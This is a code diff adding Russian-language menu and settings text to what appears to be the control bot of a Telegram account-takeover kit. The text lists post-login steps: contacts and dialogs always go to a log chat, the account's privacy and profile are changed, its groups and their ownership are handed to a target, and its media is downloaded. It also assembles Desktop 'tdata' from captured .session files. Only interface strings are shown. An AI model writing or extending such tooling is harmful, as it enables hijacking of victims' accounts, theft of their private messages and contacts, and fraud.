@@ -21,16 +21,44 @@ async def format_settings() -> str:
 		f"• Группа: <code>{s.notify_group_link or '—'}</code>",
 		f"• Сообщение: <code>{s.notify_message or '—'}</code>",
 		f"• Прокси: <code>{s.default_proxy or '—'}</code>",
-		f"• Параллельность: <code>{s.concurrency}</code>",
 		f"• Chat ID логов: <code>{s.bot_chat_id or '—'}</code>",
 		"",
-		f"Приватность: {'✅' if s.open_privacy else '⬜️'}",
-		f"Профиль: {'✅' if s.change_profile else '⬜️'}",
-		f"Уведомление: {'✅' if s.notify_group else '⬜️'}",
-		f"Перенос групп: {'✅' if s.migrate_groups else '⬜️'}",
-		f"Медиа: {'✅' if s.export_media else '⬜️'}",
+		"<b>После входа:</b>",
+		f"• Открыть приватность: {'✅' if s.open_privacy else '⬜️'}",
+		f"• Сменить username/bio: {'✅' if s.change_profile else '⬜️'}",
+		f"• Маяк в вашу группу: {'✅' if s.notify_group else '⬜️'}",
+		f"• Передать ваши группы: {'✅' if s.migrate_groups else '⬜️'}",
+		f"• Скачать фото/видео: {'✅' if s.export_media else '⬜️'}",
+		"",
+		"<i>Контакты и диалоги всегда уходят в лог-чат</i>",
 	]
 	return "\n".join(lines)
+
+
+def steps_menu_text() -> str:
+	return (
+		"<b>⚙️ Что делать после входа</b>\n\n"
+		"<b>Всегда</b> (отдельной кнопки нет):\n"
+		"• контакты, диалоги, info → в чат логов\n\n"
+		"<b>По желанию</b> (✅ вкл / ⬜️ выкл):\n"
+		"• <b>Открыть приватность</b> — кто может писать/звонить\n"
+		"• <b>Сменить username/bio</b> — из полей настроек\n"
+		"• <b>Маяк в вашу группу</b> — зайти по ссылке, написать, выйти\n"
+		"• <b>Передать ваши группы</b> — инвайт целевого + владение\n"
+		"• <b>Скачать фото/видео</b> — долго и тяжело\n\n"
+		"Нажмите кнопку, чтобы переключить."
+	)
+
+
+def actions_menu_text() -> str:
+	return (
+		"<b>🛠 Служебное</b>\n\n"
+		"• <b>Показать настройки</b> — текущий конфиг\n"
+		"• <b>Собрать tdata</b> — из уже лежащих .session "
+		"(для Desktop; после веб-входа tdata обычно уже в логах)\n"
+		"• <b>Заново: маяк + перенос</b> — сброс только этих двух шагов, "
+		"чтобы при следующем входе они снова выполнились"
+	)
 
 
 async def root_text() -> str:
